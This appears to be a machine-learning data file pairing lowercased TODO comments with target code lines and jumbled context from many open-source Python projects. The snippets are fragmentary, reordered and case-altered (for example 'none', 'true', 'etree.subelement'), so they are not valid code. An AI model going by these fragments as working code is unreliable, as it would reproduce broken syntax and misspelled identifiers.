# todo: endianness support </s> num2fmt = {1: 'b', 2: 'h', 4: 'i', 8: 'q'}	write_memory raw_mem = val else: fmt = '<{}{}'.format(num_words, num2fmt[wordsize]) if num_words == 1:
# todo: add logger here </s> print("[-] didn't work with sslv3 either - exception..." + url)	make_screenshot except: browser2.quit() return {"success": None, "error": True} else:
# todo: add 3ph loads </s> sgen = net["sgen"]	_calc_pq_elements_and_add_on_ppc p = np.hstack([p, l["p_kw"].values * vl]) b = np.hstack([b, l["bus"].values]) if not sgen.empty: sgen["controllable"] = _controllable_to_bool(sgen["controllable"])
#set limit to 25 --> currently hardcoded --> todo: add a setting for this ? </s> etree.subelement(root, "limit").text = "25"	buildVideoNodeForView Rule = etree.SubElement(root, "rule", {"field":"tag","operator":"is"}) etree.SubElement(Rule, "value").text = tagname etree.SubElement(root, "order", {"direction":"ascending"}).text = "random" WINDOW.setProperty("Emby.nodes.%s.random.title" %str(windowPropId),label)
# todo: implement toolpath.get_meta_data() </s> generator.add_moves(toolpath.path, toolpath.filters)	export_toolpath generator = pycam.Exporters.GCode.LinuxCNC.LinuxCNC(destination) for toolpath in toolpaths: generator.finish() destination.close()
# todo: this should now raise an exception </s> model = dqn.modelwrapper(	test_model_predict_single_shape def test_model_predict_single_shape(): state_axes=1, action_size=2, batch_size=3, model=small_model )
# todo(hartikainen): once tfp.bijectors.chain supports conditioning, </s> return x	_forward for bijector in self.flow: x = bijector.forward(x, **conditions.get(bijector.name, {}))
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: compare col/row widths before/after - not implemented yet </s> range('sheet1', 'a1:d4').value = 'test_string'	test_autofit_row def test_autofit_row(self): Range('Sheet1', '1:1000000').autofit() Range('Sheet1', '1:1000000').autofit(0)
# todo: add a bunch more here to ensure sane config file </s> self.verify_values('rewrite_links_serverside', [true, false])	verify_config_is_sane self.verify_values('disable_banner', [True, False])
# todo: remove anytime in 2016 </s> _assert(false, 'most granular filter was a surprising value ({}).'.format(	_get_key return [domain, parsed_params.status] else: parsed_params.most_granular_filter)) return [domain]
# todo: validate that liveactions for actionexec are all deleted. </s> liveactions_db = none	delete LOG.debug('DELETE /actionexecutions/ lookup with id=%s found object: %s', id, actionexec_db) try: liveactions_db = get_liveactions_by_actionexec_id(actionexec_db.id)
# todo: proper content negotiation </s> data = request.get_json()	__validate_payload :param bool collection: False if a single object of a resource is expected, True if a collection of objects of a resource is expected. if collection: data = data if isinstance(data, list) else [data]
# todo detect for typeerror: duplicate base class str, </s> add(cls)	py_mro mro = [self] for cls in self.py_bases(): for cls_new in cls.mro(): add(cls_new)
#todo load this from somewhere </s> pad_data = [-1.46374, -0.151816, -0.161173, 0.0686325, 0.0231148, -0.154613,	allocate_devices device.targets[:l, q] = self.data.targets[self.data.seq_start[s] + batch.start[1]:self.data.seq_start[s] + batch.start[1] + l] if self.pad_batches: -0.105614, 0.00550198, 0.0911985, 0.00502809, 0.0512826, -0.0181915, 0.0225053, -0.00149681, 0.0782062, 0.0412163, 0.0526166, -0.0722563,
# todo - check and if we don't have category, take the only placement that exists in current site </s> self._main_placement = get_cached_object(	main_placement self._main_placement = None try: Placement, target_ct=ContentType.objects.get_for_model(self.__class__),
# todo: expect_match should work with emit() </s> m = state.expect_match(	scan_command_read_shell_out state.expect('+') state.ignore() r'(?:f(?:ile)?f(?:ormat)?|(?:file)?enc(?:oding)?|(?:no)?bin(?:ary)?|bad|edit)(?=\s|$)', lambda: VimError(ERR_INVALID_ARGUMENT))
# todo: use slotssequenceelement to render this. </s> return ""	problems_p return tag
# todo: until we get it working. </s> if facts.is_from_app_store():	generate_ds_recipe by this function! keys = recipe["keys"] warn_about_app_store_generation(facts, recipe["type"]) return
pass  # todo </s> def train_check_calc_loss(self):	train_check_calc_loss
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# # todo: # fixme: </s> nb_days_seen_in_pastes = 30	hash_graph_line_json nb_days_seen_in_pastes = 30 else: date_range_seen_in_pastes = get_date_range(nb_days_seen_in_pastes) if r_serv_metadata.hget('metadata_hash:'+hash, 'estimated_type') is not None:
# todo: uncomment assert when #23880 is fixed </s> self.assertcolumnnotexists("test_rnfl_pony", "blue")	test_rename_field self.assertColumnExists("test_rnfl_pony", "pink")
raise exceptions.mpdnotimplemented  # todo </s> renames the playlist ``name.m3u`` to ``new_name.m3u``.	rename ``rename {NAME} {NEW_NAME}``
# todo(mattjj): remove this logic when allreduce pred supported on cpu / gpu </s> convert_bool = (onp.issubdtype(aval.dtype, onp.bool_)	_xla_unshard return x elif isinstance(aval, ShapedArray): and xb.get_backend(backend).platform in ('cpu', 'gpu')) if convert_bool:
# todo: warn/error: check if this var has units: assigning </s> if type(val) not in native_numeric_types:	set_value then the validation step is skipped. if not valid and val is not None: if self.parent_component()._units is not None: _src_magnitude = value(val)
# todo(#12314): add a good error about invalid data type. </s> raise invalidlockfileerror("")	from_lockfile ) except TypeError: return LockfileMetadata(requirements_digest, interpreter_constraints)
#todo: note that i'm passing a dc to the fuzzablerequest and it's not </s> fr = fuzzablerequest(self.url, method='get', dc={u'a': ['b']},	test_dump_case03 u'']) headers = Headers([(u'Hola', header_value)]) headers=headers) self.assertEqual(fr.dump(), expected)
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
# todo special function redirection and __getattr__ redirection </s> return self._data.values()[0].shape	shape def shape(self):
# todo: this really shouldn't be in this class </s> current_time = time()	getTimeCompleted @pyqtSlot(int, result = str) def getTimeCompleted(self, time_remaining: int) -> str: datetime_completed = datetime.fromtimestamp(current_time + time_remaining) return "{hour:02d}:{minute:02d}".format(hour = datetime_completed.hour, minute = datetime_completed.minute)
# todo: find a better way to enforce this. </s> fmt = "#b%0{0}d".format(op3_var.size - op1_var.size)	_translate_str elif oprnd1.size < oprnd3.size: expr = (op1_var == smtlibv2.EXTRACT(op3_var, 0, op1_var.size)) imm = smtlibv2.BitVec(op3_var.size - op1_var.size, fmt % 0) constrs = [(imm == smtlibv2.EXTRACT(op3_var, op1_var.size, op3_var.size - op1_var.size))]
# todo: what does constructor of gitconfigparser, in case file doesn't exist? </s> parser = gitconfigparser(git_config_path)	get_config_parser from os.path import exists git_config_path = opj(repo.path, get_git_dir(repo.path), "config") parser.read() return parser
# todo: some regressors have extra options in their predict method, and they return a tuple of arrays. </s> if hasattr(step, 'predict'):	fit ys = [cache[o] for o in step.outputs if o in cache] step.fit(*Xs, *ys) output_data = step.predict(*Xs) elif hasattr(step, 'transform'):
# todo: do not use bare except </s> except:	leastsq result.covar[ivar, jvar] / (par.stderr * sqrt(result.covar[jvar, jvar]))) result.errorbars = False if has_expr:
# todo: do some more checks here. currently it only tests that they </s> self.remote_node.pdo.save()	test_save def test_save(self): self.local_node.pdo.save()
# todo subject.cn from cert? </s> if cleanup:	test_simple_ipa assert proc.returncode == 0, "Return code not 0" assert exists(app_path) os.remove(app_path)
# todo if the database is not found we should build it, otherwise just run the tests. </s> c.run('echo "running integration tests"')	run_integration_tests @task(create_db, analyze_policy, write_policy, query) def run_integration_tests(c):
# todo: handle agg_columns. </s> kdf = kdf[	GroupBy for i in range(groupkey_length) ] [s.rename(label) for s, label in zip(self._groupkeys, groupkey_labels)] + [kdf._kser_for(label) for label in kdf._internal.column_labels]
# todo: check if subdirs is empty </s> latest_subdir = max(subdirs, key=os.path.getmtime)	prepare_mail_attachments if os.path.isdir(full_path): subdirs.append(full_path) logging.debug("Will look into %s for data" % latest_subdir) for file in os.listdir(latest_subdir):
# todo implement for stride != kernel_size </s> if ctx.kernel_size != ctx.stride:	MaxPool2D @staticmethod def backward(ctx, grad_output): raise NotImplementedError("CPU MaxPool2D.backward() with stride != kernel_size not implemented") idxs,s = ctx.saved_tensors
# @todo: display better tick labels for date range (e.g. 06/01 - 06/05) </s> formatter = matplotlib.dates.dateformatter('%h:%m')	show ax.xaxis.grid(False, 'major') ax.legend() ax.xaxis.set_major_formatter(formatter) ax.fmt_xdata = matplotlib.dates.DateFormatter('%H:%M')
# todo: make the multiplication sign configurable </s> expmul = r' \\times'	_tf_string_to_latex and convert float coefficients in scientific notation to prettier LaTeX representation """ thestr = sub(var + r'\^(\d{2,})', var + r'^{\1}', thestr) thestr = sub(r'[eE]\+0*(\d+)', expmul + r' 10^{\1}', thestr)
# todo: not all values have exact matches in flexget, need to update flexget qualities </s> sources = {'br-disk': 'remux',  # not a perfect match, but as close as currently possible	quality_requirement_builder def quality_requirement_builder(quality_profile): Converts CP's quality profile to a format that can be converted to FlexGet QualityRequirement 'brrip': 'bluray', 'dvdr': 'dvdrip',  # Not a perfect match, but as close as currently possible
# todo: normalization for other languages </s> return str(number)	nice_number if lang_lower.startswith("en"): return nice_number_en(result)
# todo: write this </s> pass	catmull_rom_patches def catmull_rom_patches():
# todo unordered float </s> e = []	comiss def comiss(ir, instr, a, b): a = m2_expr.ExprOp('int_32_to_float', a[:32]) b = m2_expr.ExprOp('int_32_to_float', b[:32])
# todo make more robust - some folks will write .jsx and others </s> name = componentpath.split('/').pop().split('.')[0]	generate_classes for componentPath in data: componentData = data[componentPath] generate_class_file( name,
# todo: also create an activity detail recording what exactly changed in </s> if not context.get('defer_commit'):	group_update from ckan.logic.action.create import activity_create activity_create(context, activity_dict) model.repo.commit() if errors:
# todo: cache this - it's a big time-waster when libraries get big </s> if is_built(shutit, shutit_module_obj):	stop_all shutit_module_obj = shutit.shutit_map[module_id] if run_order == -1 or shutit_module_obj.run_order <= run_order: if not shutit_module_obj.stop(shutit): shutit.fail('failed to stop: ' + \
raise notimplementederror # todo </s> def em_step(self):	EM_step
pass  # todo </s> :rtype: [int]	process_value :param str,tuple,list,dict colors: The color(s).
# todo: check if this different handling of none and '' has </s> if result == none:	run args['query'] = query result = self._query(vector, args) log.warn('%s %s' % (messages.module_sql_console.no_data, messages.module_sql_console.check_credentials)
# todo: use k-way merge instead of sort </s> n_out = len(key_arr)	par_sort_impl out = parallel_sort(key_arr) key_arr = out sort_state_o = SortState(key_arr, n_out, ()) hpat.timsort.sort(sort_state_o, key_arr, 0, n_out, ())
# todo: move this to pyresample </s> if radius_of_influence is none:	KDTreeResampler "masked pixels. Will not cache results.") cache_dir = None try: radius_of_influence = source_geo_def.lons.resolution * 3
# todo(b/132888123): consider other options to avoid possible bugs here. </s> return fn(arg)	_call arg = type_utils.convert_to_py_container(arg, parameter_type)
# todo: add keep parameter </s> return kdf	nsmallest kdf = _col(DataFrame(internal))
# todo: backport the windows implementation </s> pass	__exit__ return if sys.platform.startswith('win'): else: try:
#todo implement extra options </s> py_options = self.check_options(options)	Find def apply(self, name, n, text, evaluation, options): 'Find[InputStream[name_, n_], text_, OptionsPattern[Find]]' record_separators = py_options['RecordSeparators'] word_separators = py_options['WordSeparators']
# todo when dns server is ipv6 </s> self._sock = socket.socket(socket.af_inet, socket.sock_dgram,	add_to_loop raise Exception('already add to loop') self._loop = loop socket.SOL_UDP) self._sock.setblocking(False)
# todo: it would be nice to set the size header here </s> d = self._filenode.download(webdownloadtarget(req))	render if encoding: req.setHeader('content-encoding', encoding) d.addErrback(lambda why: None) return server.NOT_DONE_YET
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: handle in cleaner way </s> if self.multi_task:	_generate_O Note that we only include the k non-abstain values of each source, otherwise the model not minimal --> leads to singular matrix self.t = len(L) self.n, self.m = L[0].shape
# todo maybe we can figure out a version string </s> return true	installed if self.check_package_flag(name, 'forceinstalled'): self.log.debug("Package {} is assumed installed.".format(name)) for pkgr in self.get_packagers(name): pkg_version = pkgr.installed(r)
# todo(devcamcar): implement filter by user. </s> return {'projectset':	describe_projects @admin_only def describe_projects(self, context, user=None, **kwargs): [project_dict(u) for u in manager.AuthManager().get_projects()]}
# population dynamics (todo: registry) </s> for pop in self.model.populations_lif_rate:	step upsample=pop.upsample, ) step_lif_rate( self.populations[pop]['ic'],
# todo pick a runtime that is lightly loaded </s> return [random.choice(list(prefered_placements))]	select if not prefered_placements: prefered_placements = actor._possible_placements
include_base = true  # todo: make option </s> marker_size = 7  # default in git	make_inline_outputs_value local, remote = values local_note, remote_note = notes sep0 = "<"*marker_size sep1 = "|"*marker_size
# todo: error checking </s> json_obj = json.loads(content)	list_boards headers = headers, ) return json_obj.boards
# todo: we change the type here, maybe we should change it earlier? </s> self._regular_regressor_init_knot_scale = np.array(self._regular_regressor_init_knot_scale)	_set_knots_scale_matrix ) self._regular_regressor_knot_scale[self._regular_regressor_knot_scale < 1e-4] = 1e-4 self._regular_regressor_init_knot_scale[self._regular_regressor_init_knot_scale < 1e-4] = 1e-4
return wikidata_key  # todo </s> def get_language(wikidata_key, *_):	get_language
# todo: should it end with a slash? </s> url += "?t=check&output=json"	check if path: url += "/" + escape_path(path) if options["verify"]: url += "&verify=true"
# todo(todd): exception (404) </s> raise exception("missing method %s" % path[0])	process return method(path, env) else:
# todo: support for multiple message versions </s> self.extractor.category, msg[1]	dispatch raise "unsupported message-version ({}, {})".format(
# todo check performance </s> subs = array(self.subs)	_sort def _sort(self): sidx = lexsort(subs) self.subs = tuple(z.flatten()[sidx] for z in vsplit(subs, len(self.shape)))
@unittest.skip('not written')  # todo: finish! </s> self.assert_shortened([value], "[b'aaaaaaaaaaaaaaaaaa...aaaaaaaaa']")	test_bytes_large "b'" + 'A' * 43688 + "..." + 'A' * 21844 + "'")
# todo - fix meta.submission to point to real submission </s> self._add_handled(self.submission.submission, message)	save enddate = startdate + timedelta(days=1) message = self.get_submission_count(startdate, enddate)
# rbarlow_todo: convert this callrequest into a celery task call </s> call_request = callrequest(manager.uninstall_content, args, kwargs, weight=weight, tags=tags, archive=true, asynchronous=true)	consumer_content_uninstall_itinerary tags = [resource_tag(dispatch_constants.RESOURCE_CONSUMER_TYPE, consumer_id), action_tag('unit_uninstall')] call_request.add_control_hook(dispatch_constants.CALL_CANCEL_CONTROL_HOOK, cancel_agent_request) call_request.reads_resource(dispatch_constants.RESOURCE_CONSUMER_TYPE, consumer_id)
# todo: spawn process which sets resource limits and then calls </s> reactor.spawnprocess(self, *args, **kwargs)	spawn def spawn(self, *args, **kwargs):
# todo: this is a temporal fix </s> pixels = np.rollaxis(pixels, 0, len(pixels.shape))	hog ValueError Window step unit must be either pixels or cells if mode not in ['dense', 'sparse']: raise ValueError("HOG features mode must be either dense or sparse")
# todo: the peer node url needs to be fixed. </s> "core_peer_address": "{}.{}:{}".format(	create "CORE_PEER_TLS_ROOTCERT_FILE": "{}/{}/peers/{}/tls/ca.crt".format( dir_node, org_name, peer_node.name + "." + org_name), peer_node.name, org_name, 7051), "CORE_PEER_MSPCONFIGPATH": "{}/{}/users/Admin@{}/msp".format(
# todo: disclaimer!!! this is a temporary hack to escape from current "ddos attack" </s> agent = request.meta.get("http_user_agent", "")	process_request def process_request(self, request): blocked_web_agents = [a.lower() for a in settings.BLOCKED_WEB_AGENTS] if blocked_web_agents and agent.lower() in blocked_web_agents:
# todo add binary column (after dropping support for python 2.7) </s> df = pd.dataframe({	test_generate_ddl def test_generate_ddl(self): 'col_int': np.int32([1]), 'col_bigint': np.int64([12345]),
result = np.hstack((result, result_a))  # todo: https://github.com/tensorlayer/tensorlayer/issues/288 </s> return result	predict feed_dict.update(dp_dict) result_a = sess.run(y_op, feed_dict=feed_dict)
# todo scope the cleanup to the current project - https://github.com/lyft/cartography/issues/381 </s> cleanup_gcp_instances(neo4j_session, common_job_parameters)	sync_gcp_instances instance_list = transform_gcp_instances(instance_responses) load_gcp_instances(neo4j_session, instance_list, gcp_update_tag)
# todo: convert to a python xml thing </s> print unicode(toc.tostring())	on_actionRender_triggered toc=self.pdf.document.toc() if toc:
# todo(mattjj): remove this special case, used for debugging on cpu </s> dims = c.getshape(x).dimensions()	split_array def split_array(shape, x): if xb.get_replica_count() == 1: return c.Reshape(x, None, dims[1:]) else:
# todo: arrange </s> repo = self.remote.new_repo(self.token)	test_create_repo def test_create_repo(self): Test: create/edit a repo object self.assertTrue(self.remote.modify_repo(repo, "name", "testrepo0", self.token)) self.assertTrue(self.remote.modify_repo(repo, "mirror", "http://www.sample.com/path/to/some/repo", self.token))
# todo-me move sorting and add more sorting options </s> aired_lst = sorted(child_lst, key=operator.itemgetter(1))	get_all_content else: pass play_lst = [x[0] for x in aired_lst] return play_lst
# todo(karita): make all scorers batchfied </s> if batch_size == 1:	__init__ pre_beam_score_key=None if ctc_weight == 1.0 else "full", ) non_batch = [ k
singleton=false,  # todo: re-enable </s> )	pillars tag='pillar', pack=pack, return FilterDictWrapper(ret, '.ext_pillar')
# todo this is a workaround since exceptions are currently not correctly stacked </s> pass	search return self._search(self.pattern, string, pos, default(endpos, -1)) except RuntimeError: return self.__compile_cpython_sre().search(string, pos, default(endpos, maxsize()))
# todo put an index.html in front of this bucket </s> def upload_pip_index(scratch_directory, target_bucket, version):	upload_pip_index @do
# todo: handle other hosts </s> raise notimplementederror	get_ipv4_addresses return addr_list else:
# todo : real error </s> print "error : bad expression near", tmp	eval_cor_pattern tmp = tmp.strip() if stacked_par == 1 and tmp != '': continue if stacked_par > 1:
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_psubb res = 0xffe0fb00fffd00a000fdfbf9ff0000a0 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo use proper tx, txindex, sibling.  should also test that </s> txblockhash = b1	testHeadersFrom100K res = self.c.verifyTx(tx, txIndex, sibling, txBlockHash) assert res == 0 res = self.c.verifyTx(tx, txIndex, sibling, txBlockHash) assert res == 0
# todo(b/133761055): update all callers and make this an error condition to </s> if self._eval_shared_model.construct_fn is none:	_start_bundle def _start_bundle(self) -> None: construct_fn = dofn.make_construct_fn( self._eval_shared_model.model_path,
# todo: saved searches </s> return categories	get_categories icon_map[cat_name] = icon_map['user:'] categories[cat_name] = sort_categories(items, sort)
# todo: logging </s> return none	_get_bytes_to_sign ] else: outbytes = StringIO() for field_name in fields_to_sign:
#todo - this should probably syslog </s> pass	errorlog def errorlog(self, num, msg):
# todo(stephenfin): remove this in a future major version </s> self.fake_servers[0].clear_password.assert_called_once_with()	test_server_set_with_no_password self.cmd.take_action(parsed_args)
# todo allow exporting poseunits </s> skel = human.getskeleton()	writeLibraryAnimations def writeLibraryAnimations(fp, human, config): return if (skel is None or not config.useFaceRig):
# todo(mordred) when this changes to rest, force interface=admin </s> type_ = kwargs.pop('type', none)	update_service 'Unavailable Feature: Service update requires Identity v3' ) service_type = kwargs.pop('service_type', None) if type_ or service_type:
pass # todo </s> def _find(self, type, what):	_find @register(r'^find (?P<type>(album|artist|title)) (?P<what>.*)$')
# todo: this could be a property.  handle it! </s> pass	get_nodes_by_priority found_nodes.append(node) except AttributeError: for node in node.content: OrgDataStructure.get_nodes_by_priority(node, priority, found_nodes)
# todo: remove for all locales generated by the doc. </s> old_rules = self._routing_rules	remove_document if not rule: return self._routing_rules = [] for rule in old_rules:
# todo: implement </s> can be either registered (and thus, logged in), or only session-based guests	get_shipping_address_from_request Get the shipping address from the request. This abstracts the fact that users
# todo message </s> ds.remove(db_path)	__call__ ds.add(db_path) elif exists(db_path): elif not isinstance(ds.repo, AnnexRepo): for ap in [c for c in content if ap.get('raw_input', False)]:
# todo: must be implemented </s> pass	get_range_using_urls def get_range_using_urls(self, crawler):
# todo: ensure that if multiple flags are provided, the *last* one overrides </s> pwd = os.path.realpath(dest_dir) if arg.p else dest_dir	Cd util.error("cd %r: %s", dest_dir, os.strerror(e.errno)) return 1 state.SetGlobalString(mem, 'PWD', pwd) dir_stack.Reset()  # for pushd/popd/dirs
# todo we could reload the message </s> pass	Forward await self.get_input_sender()) except ValueError: return self._sender @property
# todo: rate should not have to be inversed </s> rate = math.exp(-graph[start][end]['weight'])	print_profit_opportunity_for_path start = path[i] end = path[i + 1] money *= rate print("%(start)s to %(end)s at %(rate)f = %(money)f" % {"start": start, "end": end, "rate": rate,
# todo(cmaloney): test user provided parameters are present. all the </s> assert 'master_quorum' not in user_config	test_load_user_config user_config = yaml.load(f)
# todo: move to base class </s> return self._maximum_scale	viewMaximumScale def viewMaximumScale(self):
# todo: revisit for potential behaviour / type checking. </s> self._use_derived_xyz_to_rgb_matrix = value	use_derived_XYZ_to_RGB_matrix value : bool Attribute value.
"""todo: explain what this is testing </s> or at least use explicit variable names...	test_infer_dim_2 def test_infer_dim_2(): n, p = 1000, 5 X = randn(n, p) * .1
# todo(b/148082271): remove this line once tft 0.22 is used. </s> transformed_features.pop(_transformed_name(_label_key), none)	serve_tf_examples_fn parsed_features = tf.io.parse_example(serialized_tf_examples, feature_spec) transformed_features = model.tft_layer(parsed_features) return model(transformed_features)
# todo: no coverage here </s> obj = state.get_impl(self.key).get_committed_value(state, state.dict, passive=passive)	getcommitted def getcommitted(self, state, column, passive=False): return self.get_col_value(column, obj)
# todo - fix this problem with bad imports from bitbucket </s> print >> stdout, "problems with %s" % package.title	get_bitbucket_commits data = json.loads(page) except ValueError, e: print >> stdout, target print >> stdout, e
# todo: make sure we only call get_transform if the transform for </s> tr = self._line.get_transform(map_from='visual', map_to='canvas')	_rotation_angle def _rotation_angle(self): Determine the rotation angle of the axis as projected onto the canvas. trpos = tr.map(self.pos) x1, y1, x2, y2 = trpos[:, :2].ravel()
# todo(twd2): improve here: </s> for mdoc in mdocs:	HomeMessagesView user.attach_udocs(mdocs, 'sender_uid', 'sender_udoc', user.PROJECTION_PUBLIC), user.attach_udocs(mdocs, 'sendee_uid', 'sendee_udoc', user.PROJECTION_PUBLIC)) mdoc['sender_udoc']['gravatar_url'] = ( template.gravatar_url(mdoc['sender_udoc']['gravatar'] or None))
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo(mjanusz): remove circular reference between canvas and seed policies. </s> self.canvas = weakref.proxy(canvas)	BaseMovementPolicy scored_coords: mutable container of tuples (score, zyx coord) deltas: step sizes as (z,y,x) self.scored_coords = scored_coords self.deltas = np.array(deltas)
# todo scope the cleanup to the current project - https://github.com/lyft/cartography/issues/381 </s> cleanup_gcp_vpcs(neo4j_session, common_job_parameters)	sync_gcp_vpcs vpcs = transform_gcp_vpcs(vpc_res) load_gcp_vpcs(neo4j_session, vpcs, gcp_update_tag)
raise notimplementederror()  # todo </s> :param str profile_name: the name of the profile to remove.	remove_settings_profile Not implemented yet!
# todo(okuta): check type </s> return core.moveaxis(a, source, destination)	moveaxis Array with moved axes. This array is a view of the input array. .. seealso:: :func:`numpy.moveaxis`
except (keyerror,valueerror): # todo, handle errordetail messages </s> sys.stdout.write(line)	build try: sys.stdout.write(json.loads(line)["stream"]) output += chunk search = r'Successfully built ([0-9a-f]+)'
# todo: cp.get_file will also match cp.get_file_str. this is the </s> if module:	argspec_report argspec function sigs ret = {} comps = module.split('.') comps = filter(None, comps)
# todo move this to spotify.luigi.hdfs </s> @classmethod	hdfs_writer def hdfs_writer(cls, path): raise NotImplementedError()
# todo: why is there a benchmark? </s> trade_start_time = "2017-01-01"	_main } } trade_end_time = "2020-08-01" benchmark = "SH000300"
# todo use deepcopy() here </s> return polygonsonimage(polygons, shape)	on return self.deepcopy() polygons = [poly.project(self.shape, shape) for poly in self.polygons]
# todo: log. </s> continue	by_fileid for prov_item in response.provideritem: if not hasattr(prov_item, 'record') or not str(prov_item.record): for record_item in prov_item.record.recorditem: map_[record_item.fileid] = record_item
# todo assert exit code != 0 </s> self.assertequal(dvol.voluminous.getoutput(),	test_create_volume_already_exists dvol = VoluminousOptions() dvol.parseOptions(ARGS + ["-p", self.tmpdir.path, "init", "foo"]) ["Error: volume foo already exists"])
# todo: this might be too slow because of the addition </s> data = reduce(lambda res, (key,val): res + int(val)*[key], data.iteritems(), [] )	get elif config.get('compress', False): data = self._client.hgetall(interval_key) if config.get('read_cast'): data = map(config.get('read_cast'), data)
min_stake=0)  # todo: handle customized min stake here. </s> client = nucyphermiddlewareclient()	get_external_ip_from_default_teacher registry=registry, federated_only=federated_only, try: response = client.get(node_or_sprout=teacher, path=f"ping", timeout=2)  # TLS certificate logic within
# todo: fix this 405 method not allowed error </s> data = rv.data.decode('utf-8')	test_model_list_order rv = client.post('/model1view/list?_oc_Model1View=field_string&_od_Model1View=asc', follow_redirects=True) rv = client.post('/model1view/list?_oc_Model1View=field_string&_od_Model1View=desc', follow_redirects=True)
# todo: same code as for batch gradient, but with sum_batch = true </s> def bias(self, module, grad_input, grad_output):	bias shape = module.bias.shape bias_grad = self.bias_jac_t_mat_prod(
# todo: launch visitor on node </s> return node	visit_Subscript mem = self.parse_mem.search(name) if mem is None: addr = self.visit(node.slice.value) call = ast.Call(func=ast.Name(id='ExprMem', ctx=ast.Load()),
# todo: this pattern seems to repeat a lot, maybe we should have a sensible default? </s> config = fluffconfig(overrides=dict(dialect=dialect))	lint except AttributeError: raise TypeError("Value passed as sql is not a string or a readable object.") linter = Linter(config=config) result = linter.lint_string_wrapped(sql, fname=fname)
self.entity_bin = serialize(value, to_bytes=true)  # todo: techdebt fix </s> def obj(self, value: any) -> none:	obj @obj.setter
# todo legacy method to be removed/refactored </s> from corehq.apps.commtrack.models import supplypointcase	remove_location def remove_location(self, location): sp = SupplyPointCase.get_by_location(location) mapping = self.get_location_map_case()
except exception:  # todo: be specific </s> tools.stderr("encountered an error while writing the config file."	plugins_wizard try: settings.save() " This shouldn't happen. Check permissions.") raise
# todo: get runname from model-dir </s> summary_dir = os.path.join(config.train.log_dir, config.train.run_name)	evaluate ) saver = get_saver((model, pretrained, )) with tf.Session() as sess: sess.run(init_op)
## todo: # fixme: remove me </s> paste_children = self.r_serv_metadata.smembers('paste_children:{}'.format(paste))	get_domain_son paste_full = paste.replace(self.paste_directory+'/', '') paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_full)) paste_childrens = paste_childrens | paste_children for children in paste_childrens:
# todo: make sure the image is present or pull it </s> base_image = "registry.fedoraproject.org/fedora:28"	test_build_basic_image def test_build_basic_image(): basic_playbook_path = os.path.join(data_dir, "basic_playbook.yaml") target_image = "registry.example.com/ab-test-" + random_word(12) + ":oldest" cmd = ["build", basic_playbook_path, base_image, target_image]
# todo: ask where to install the bootloader (if the user wants to install it) </s> import bootloader	start_installation fs_devices[swap] = "swap" fs_devices[partition_path] = self.row[2] bl = bootloader.BootLoader(self.settings) bl.ask()
# todo: we can't do this; this shells out for each selection change... </s> actions["vcpush"] = true	update_actions_for_paths _vc.STATE_NONE, _vc.STATE_IGNORED) for s in states) actions["VcUpdate"] = True actions["VcAdd"] = all(s not in ( _vc.STATE_NORMAL, _vc.STATE_REMOVED) for s in states)
# todo: start here </s> for path in self._fs.ls(dir_path):	_archive_dir tar_gz_name = ( self._working_dir_mgr.name('dir', dir_path, name) + '.tar.gz') pass
# todo: enable gpu tests on jenkins </s> if ctx == mx.context("gpu") and not check_gpu_support():	test_jitter_unit @pytest.mark.parametrize("float_type", [np.float32, np.float64]) def test_jitter_unit(jitter_method, float_type, ctx) -> None: return matrix = nd.array(
# todo(tdurakov): remove dict to object conversion once rpc api version </s> if not got_migrate_data_object and migrate_data:	pre_live_migration context, instance, "live_migration.pre.end", network_info=network_info) migrate_data = migrate_data.to_legacy_dict( pre_migration_result=True)
# todo: revise this when build deps are in dag_hash </s> conc = read_separately.concretized().copy(deps=stored_deptypes)	test_read_and_write_spec norm = read_separately.normalized().copy(deps=stored_deptypes) self.assertEqual(norm, spec_from_file) self.assertEqual(conc, spec_from_file) self.assertEqual(expected.dag_hash(), spec_from_file.dag_hash())
# todo(b/155804245) sanitize the names so that they're valid python names </s> input_channel_parameters[input_name] = (	create_container_component execution_parameters = {} for input_name, channel_type in inputs.items(): component_spec.ChannelParameter( type=channel_type,
#todo: add check/warning if theta or phi outside appropriate ranges </s> r1 = -(l + 1) / r ** (l + 2) * sph_harmonic(l, m, theta, phi)	grad_in_comp Compute gradient of LHS of V(r) spherical expansion having form Ylm(theta, phi) / (r ** (l+1)) theta1 = 1 / r ** (l + 2) * np.sqrt((2 * l + 1) * factorial(l - m) / (4 * np.pi * factorial(l + m))) * \
raise  # todo </s> else:	deploy_contract cached_contract = self.__contract_cache[contract_name] except KeyError: self.__registrar.enroll(contract_name=contract_name, contract_address=address,
# todo: take care of theano to keras port: </s> ))	vgg16 net["conv_1_pool"], 2, "conv_2", 128, activation=activation, net.update(base.conv_pool( net["conv_2_pool"], 3, "conv_3", 256,
# todo: has to be refactored. </s> try:	write_v6_config template_file = "/etc/cobbler/dhcp6.template" blender_cache = {} f2 = open(template_file, "r") except Exception:
# todo: implement @plist </s> return _makearticlist(elem.get('artic'))	articFromElement ============ None.
# todo: assert metrics. </s> metrics = code_analysis_server.metrics(	test_get_metrics error = repository.get_metrics(commit, metrics["spaces"]) assert not error "file.jsm", let i = 0;
# todo: docs for this. </s> return	__setitem__ setattr(self, attr, value)
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
# todo: remove in v8 </s> return ord(x)	hash_str x = hashlib.md5(string.encode('utf-8')).digest()[pos] try: except TypeError: return x
